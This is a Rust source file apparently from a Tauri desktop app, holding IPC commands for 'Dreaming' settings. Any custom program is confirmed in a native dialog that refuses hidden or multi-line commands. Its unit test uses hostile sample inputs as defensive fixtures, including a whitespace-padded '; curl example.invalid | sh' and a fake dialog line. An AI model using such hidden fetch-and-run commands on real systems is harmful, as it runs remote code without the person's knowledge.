//! Webview commands for the Dreaming settings page: read and save the
//! dreamer, list what this machine has, and run one test call. IPC-only, like
//! the provider-key commands; nothing here is proxied over loopback HTTP.
// Reached from the desktop commands today; the headless dream cycle
// (Phase 2) will call it too.
#![cfg_attr(not(feature = "desktop"), allow(dead_code))]

use crate::app_runtime::AppHandle;
use crate::dreamer::{
    call_dreamer, detect_dreamers, read_dreamer_config, test_passed, test_request,
    write_dreamer_config, DetectedDreamer, DreamerConfig, DEFAULT_TIMEOUT,
};
use std::sync::{atomic::AtomicBool, Arc};

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn get_dreamer_config(app: AppHandle) -> Result<DreamerConfig, String> {
    read_dreamer_config(&app)
}

/// The program a dreamer would run when the page, not a preset's own
/// detection, said which: a custom dreamer, or a preset with its location
/// overridden. With the arguments, for showing to the person.
///
/// Each part is shown quoted, so an argument cannot pass for two or hide a
/// space. A command too long to show whole, or holding a control character
/// (a line break could fake a second paragraph of the dialog), is refused:
/// the person must be able to read all of what they allow.
fn named_program(config: &DreamerConfig) -> Option<Result<String, String>> {
    const MAX_SHOWN: usize = 400;
    match config {
        DreamerConfig::App { program: Some(program), args, .. } if !program.trim().is_empty() => {
            let parts: Vec<&str> = std::iter::once(program.as_str()).chain(args.iter().map(String::as_str)).collect();
            if parts.iter().any(|part| part.chars().any(char::is_control)) {
                return Some(Err("a dreamer's program and arguments can't contain line breaks or control characters".to_string()));
            }
            let shown = parts.iter().map(|part| format!("{part:?}")).collect::<Vec<_>>().join(" ");
            if shown.chars().count() > MAX_SHOWN {
                return Some(Err(format!("a dreamer's command must fit in {MAX_SHOWN} characters so it can be shown to you whole")));
            }
            Some(Ok(shown))
        }
        _ => None,
    }
}

/// A dreamer that names its own program runs that program as the person.
/// Saving or trying one that is not the saved dreamer is asked in a native
/// dialog, which nothing running in the page can answer. The saved dreamer
/// was asked about when it was saved.
async fn confirm_named_program(app: &AppHandle, config: &DreamerConfig) -> Result<(), String> {
    let Some(command_line) = named_program(config) else {
        return Ok(());
    };
    let command_line = command_line?;
    let saved = read_dreamer_config(app).ok();
    if saved.as_ref().and_then(|saved| serde_json::to_value(saved).ok()) == serde_json::to_value(config).ok() {
        return Ok(());
    }
    ask_to_run(app, command_line).await
}

#[cfg(feature = "desktop")]
async fn ask_to_run(app: &AppHandle, command_line: String) -> Result<(), String> {
    use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};
    use std::sync::atomic::Ordering;
    // One question at a time: a page that asks in a loop gets refusals, not
    // a stack of dialogs to wear the person down.
    static ASKING: AtomicBool = AtomicBool::new(false);
    if ASKING.swap(true, Ordering::SeqCst) {
        return Err("The question is already on screen.".to_string());
    }
    struct Asked;
    impl Drop for Asked {
        fn drop(&mut self) {
            ASKING.store(false, Ordering::SeqCst);
        }
    }
    let app = app.clone();
    let shown = command_line;
    let allowed = tauri::async_runtime::spawn_blocking(move || {
        let _asked = Asked;
        app.dialog()
            .message(format!(
                "Dreaming would run this program on your computer, as you:\n\n{shown}\n\nAllow it only if you chose it yourself."
            ))
            .title("Let Dreaming run this program?")
            .kind(MessageDialogKind::Warning)
            .buttons(MessageDialogButtons::OkCancelCustom("Allow".to_string(), "Cancel".to_string()))
            .blocking_show()
    })
    .await
    .map_err(|error| format!("dreamer program question: {error}"))?;
    if allowed {
        Ok(())
    } else {
        Err("The program was not allowed.".to_string())
    }
}

/// No page exists without the desktop app, so there is nobody to ask and
/// nothing untrusted asking.
#[cfg(not(feature = "desktop"))]
async fn ask_to_run(_app: &AppHandle, _command_line: String) -> Result<(), String> {
    Ok(())
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn set_dreamer_config(app: AppHandle, config: DreamerConfig) -> Result<(), String> {
    confirm_named_program(&app, &config).await?;
    write_dreamer_config(&app, config)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn list_dreamers() -> Result<Vec<DetectedDreamer>, String> {
    Ok(detect_dreamers().await)
}

/// One fixed test prompt through `config` (or the saved dreamer when none is
/// given, so a choice can be tried before it is saved). The person pressing
/// the button is the consent; the receipt says so.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn test_dreamer(
    app: AppHandle,
    config: Option<DreamerConfig>,
) -> Result<serde_json::Value, String> {
    let config = match config {
        Some(config) => config,
        None => read_dreamer_config(&app)?,
    };
    confirm_named_program(&app, &config).await?;
    let consent: crate::dreamer::ConsentGate = Arc::new(|| Ok("user-invoked test".to_string()));
    let reply = call_dreamer(
        &app,
        &config,
        &test_request(),
        consent,
        Arc::new(AtomicBool::new(false)),
        DEFAULT_TIMEOUT,
    )
    .await;
    Ok(serde_json::json!({
        "passed": test_passed(&reply),
        "reply": reply,
    }))
}

/// Everything a dream cycle runs with: the four editable mechanics (value,
/// default, edited) and every house-authored constant. Readable without
/// agreeing to anything.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn get_dream_mechanics(app: AppHandle) -> Result<serde_json::Value, String> {
    crate::dreaming::mechanics::mechanics_view(&app)
}

/// The person agrees to the "we don't recommend changing these" notice.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn agree_to_dream_notice(app: AppHandle, notice_version: u32) -> Result<serde_json::Value, String> {
    crate::dreaming::mechanics::agree_to_notice(&app, notice_version)
}

/// Replace the edits; a `null` field is the house default. Changing anything
/// away from a default needs the current notice agreed to.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn set_dream_mechanics(
    app: AppHandle,
    edits: crate::dreaming::mechanics::MechanicsEdits,
) -> Result<serde_json::Value, String> {
    crate::dreaming::mechanics::set_mechanics(&app, edits)
}

/// Dream now: one cycle for one graph, by hand. The person pressing the
/// button is the consent. `dryRun` returns the exact prompts without asking
/// the dreamer or writing anything.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn dream_now(
    app: AppHandle,
    graph_id: String,
    dry_run: Option<bool>,
) -> Result<serde_json::Value, String> {
    let consent: crate::dreamer::ConsentGate = Arc::new(|| Ok("user-invoked dream now".to_string()));
    crate::dreaming::cycle::dream_now(app, graph_id, dry_run.unwrap_or(false), consent, Arc::new(AtomicBool::new(false)), crate::dreaming::cycle::MANUAL).await
}

/// What this graph keeps out of its dreams: folders (with everything under
/// them) and documents. Empty means the whole graph dreams.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn get_dream_exclusions(app: AppHandle, graph_id: String) -> Result<serde_json::Value, String> {
    let graph_dir = crate::paths::existing_graph_dir(&app, &graph_id)?;
    let (exclusions, error) = crate::dreaming::exclusions::read_reported(&graph_dir);
    Ok(serde_json::json!({ "exclusions": exclusions, "fileError": error }))
}

/// This graph's dream settings (the residue window in days, default 5, 0
/// turns the slot off; nightly consent, off by default), the night window,
/// and the last cycle.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn get_dream_graph_settings(app: AppHandle, graph_id: String) -> Result<serde_json::Value, String> {
    use crate::dreaming::scheduler;
    let graph_dir = crate::paths::existing_graph_dir(&app, &graph_id)?;
    let (settings, error) = crate::dreaming::graph_settings::read_reported(&graph_dir);
    Ok(serde_json::json!({
        "settings": settings,
        "effective": settings.receipt(),
        "defaults": { "residueDays": crate::dreaming::graph_settings::DEFAULT_RESIDUE_DAYS, "nightly": false, "catchUp": false },
        "nightWindowHours": scheduler::NIGHT_WINDOW_HOURS,
        "cooldownHours": scheduler::COOLDOWN_HOURS,
        "lastCycle": scheduler::read_cycle_log(&graph_dir).map_err(|e| serde_json::json!({ "error": e })).map_or_else(|e| e, |log| serde_json::json!(log)),
        "fileError": error,
    }))
}

/// Change the residue window (`null` = the default). Nightly consent is
/// not changed here; see `set_dream_nightly`.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn set_dream_residue_days(app: AppHandle, graph_id: String, residue_days: Option<f64>) -> Result<serde_json::Value, String> {
    let _write = crate::dreaming::cycle::graph_write_lease(&app, &graph_id).await?;
    let graph_dir = crate::paths::existing_graph_dir(&app, &graph_id)?;
    let settings = crate::dreaming::graph_settings::set_residue_days(&graph_dir, residue_days)?;
    Ok(serde_json::json!(settings))
}

/// Whether this graph dreams once on the next wake after sleeping through
/// the night window (`null` = the default, which waits for the next window).
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn set_dream_catch_up(app: AppHandle, graph_id: String, catch_up: Option<bool>) -> Result<serde_json::Value, String> {
    let _write = crate::dreaming::cycle::graph_write_lease(&app, &graph_id).await?;
    let graph_dir = crate::paths::existing_graph_dir(&app, &graph_id)?;
    let settings = crate::dreaming::graph_settings::set_catch_up(&graph_dir, catch_up)?;
    Ok(serde_json::json!(settings))
}

/// Turn nightly dreaming on or off for one graph: the person's consent to
/// be dreamed on unattended, stamped with the time. Taken under the graph
/// write lease, as dream publication is: once this returns, no publication
/// that hasn't already passed its final check can ignore it.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn set_dream_nightly(app: AppHandle, graph_id: String, enabled: bool) -> Result<serde_json::Value, String> {
    let _write = crate::dreaming::cycle::graph_write_lease(&app, &graph_id).await?;
    let graph_dir = crate::paths::existing_graph_dir(&app, &graph_id)?;
    let settings = crate::dreaming::graph_settings::set_nightly(&graph_dir, enabled)?;
    Ok(serde_json::json!(settings))
}

/// Under the graph write lease, like `set_dream_nightly`.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn set_dream_exclusions(
    app: AppHandle,
    graph_id: String,
    exclusions: crate::dreaming::exclusions::Exclusions,
) -> Result<(), String> {
    let _write = crate::dreaming::cycle::graph_write_lease(&app, &graph_id).await?;
    let graph_dir = crate::paths::existing_graph_dir(&app, &graph_id)?;
    crate::dreaming::exclusions::write(&graph_dir, &exclusions)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_a_dreamer_that_names_its_program_is_asked_about() {
        let custom: DreamerConfig = serde_json::from_value(serde_json::json!({
            "kind": "app", "preset": "custom", "program": "/bin/sh", "args": ["-c", "id"], "acceptReducedIsolation": true
        }))
        .or_else(|_| serde_json::from_value(serde_json::json!({
            "type": "app", "preset": "custom", "program": "/bin/sh", "args": ["-c", "id"], "acceptReducedIsolation": true
        })))
        .expect("custom dreamer config");
        assert_eq!(named_program(&custom), Some(Ok(r#""/bin/sh" "-c" "id""#.to_string())));
        let with = |args: Vec<String>| DreamerConfig::App {
            preset: crate::dreamer::AppPreset::Custom,
            program: Some("/bin/sh".to_string()),
            model: None,
            args,
            accept_reduced_isolation: true,
        };
        // Padding that would push the real command out of sight is refused.
        let hidden = with(vec!["-c".to_string(), format!("{}; curl example.invalid | sh", " ".repeat(400))]);
        assert!(matches!(named_program(&hidden), Some(Err(_))));
        let two_lines = with(vec!["-c".to_string(), "true\n\nThis is safe.".to_string()]);
        assert!(matches!(named_program(&two_lines), Some(Err(_))));
        assert_eq!(named_program(&DreamerConfig::None), None);
        let endpoint = DreamerConfig::Endpoint {
            base_url: "http://localhost:11434/v1".to_string(),
            model: "m".to_string(),
            api_key_provider: None,
        };
        assert_eq!(named_program(&endpoint), None);
    }
}
